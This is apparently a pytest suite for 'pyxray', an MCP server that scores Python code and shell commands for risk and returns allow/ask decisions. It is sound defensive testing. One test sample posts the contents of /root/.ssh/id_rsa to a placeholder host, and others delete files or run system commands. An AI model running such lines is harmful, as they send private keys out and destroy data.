"""The MCP server, driven the way a client drives it: a subprocess, one JSON
line per message, over stdin and stdout."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]


class Client:
    def __init__(self, env: dict[str, str]) -> None:
        full = {**os.environ, "PYTHONPATH": str(ROOT / "python"), **env}
        self.proc = subprocess.Popen(
            [sys.executable, "-m", "pyxray_agent.mcp"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, env=full,
        )
        self.next = 0

    def send(self, method: str, params: dict | None = None, *, notify: bool = False) -> dict | None:
        msg: dict = {"jsonrpc": "2.0", "method": method}
        if params is not None:
            msg["params"] = params
        if not notify:
            self.next += 1
            msg["id"] = self.next
        self.raw(json.dumps(msg))
        return None if notify else self.read()

    def raw(self, line: str) -> None:
        assert self.proc.stdin
        self.proc.stdin.write(line + "\n")
        self.proc.stdin.flush()

    def read(self) -> dict:
        assert self.proc.stdout
        return json.loads(self.proc.stdout.readline())

    def call(self, name: str, **arguments) -> dict:
        reply = self.send("tools/call", {"name": name, "arguments": arguments})
        assert reply and "result" in reply, reply
        return reply["result"]

    def close(self) -> None:
        if self.proc.stdin:
            self.proc.stdin.close()
        self.proc.wait(timeout=30)


@pytest.fixture
def client(tmp_path):
    log = tmp_path / "feed.jsonl"
    c = Client({"PYXRAY_LOG": str(log), "PYXRAY_POLICY": "off"})
    init = c.send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                 "clientInfo": {"name": "test", "version": "0"}})
    assert init["result"]["serverInfo"]["name"] == "pyxray"
    assert init["result"]["protocolVersion"] == "2025-06-18"
    c.send("notifications/initialized", notify=True)
    c.log = log  # type: ignore[attr-defined]
    yield c
    c.close()


def test_lists_its_tools(client):
    tools = client.send("tools/list")["result"]["tools"]
    names = {t["name"] for t in tools}
    assert names == {"analyze", "extract", "check", "explain", "feed"}
    assert all(t["annotations"]["readOnlyHint"] for t in tools)


def test_analyze_code(client):
    r = client.call("analyze", code="import shutil\nshutil.rmtree('/tmp/x')\n")
    assert r["structuredContent"]["risk"] >= 30
    assert "rmtree" in r["content"][0]["text"]
    assert not client.log.exists(), "analysis must not write the feed"


def test_analyze_a_path_follows_its_imports(client, tmp_path):
    (tmp_path / "helper.py").write_bytes(b"import os\n\ndef go():\n    os.system('make')\n")
    (tmp_path / "main.py").write_bytes(b"import helper\nhelper.go()\n")
    r = client.call("analyze", path=str(tmp_path / "main.py"))
    s = r["structuredContent"]
    assert s["imports_followed"] == ["helper.py"]
    assert any(e.get("file") == "helper.py" for e in s["effects"])


def test_extract_a_command(client):
    r = client.call("extract", command="cd /tmp && python3 -c 'import os; os.remove(\"x\")'")
    snippets = r["structuredContent"]["snippets"]
    assert len(snippets) == 1 and snippets[0]["risk"] >= 30


def test_check_under_a_gate(tmp_path):
    c = Client({"PYXRAY_LOG": str(tmp_path / "f.jsonl"), "PYXRAY_GATE": "10", "PYXRAY_POLICY": "off"})
    c.send("initialize", {"protocolVersion": "2025-06-18"})
    r = c.call("check", command="python3 -c 'import os; os.system(\"ls\")'")
    assert r["structuredContent"]["decision"] == "ask"
    r = c.call("check", code="print(1)")
    assert r["structuredContent"]["decision"] == "allow"
    c.close()


def test_explain_sums(client):
    r = client.call("explain", code="import os, requests\nrequests.post('https://x', data=open('/root/.ssh/id_rsa').read())\n")
    s = r["structuredContent"]
    assert s["risk"] == min(100, sum(t["points"] for t in s["terms"]))
    assert any("sent over the network" in t["why"] for t in s["terms"])


def test_feed(client):
    client.log.write_text(json.dumps({"schema": 1, "ts": 1, "name": "a.py", "source": "hook", "lines": 1,
                                      "risk": 30, "band": "check", "mask": 16, "worst": "caution",
                                      "synopsis": "runs `ls`", "notes": [], "blocked": False}) + "\n")
    r = client.call("feed", n=5)
    assert r["structuredContent"]["rows"][0]["synopsis"] == "runs `ls`"
    assert client.call("feed", floor="read")["structuredContent"]["rows"] == []


def test_bad_calls_are_errors_not_crashes(client):
    assert client.call("analyze")["isError"] is True
    assert client.call("analyze", path="/nonexistent.py")["isError"] is True
    assert client.call("feed", floor="scary")["isError"] is True
    reply = client.send("tools/call", {"name": "rm", "arguments": {}})
    assert reply["error"]["code"] == -32602
    assert client.send("nonsense")["error"]["code"] == -32601
    client.raw("{not json")
    assert client.read()["error"]["code"] == -32700
    assert client.send("ping")["result"] == {}, "still serving after all that"
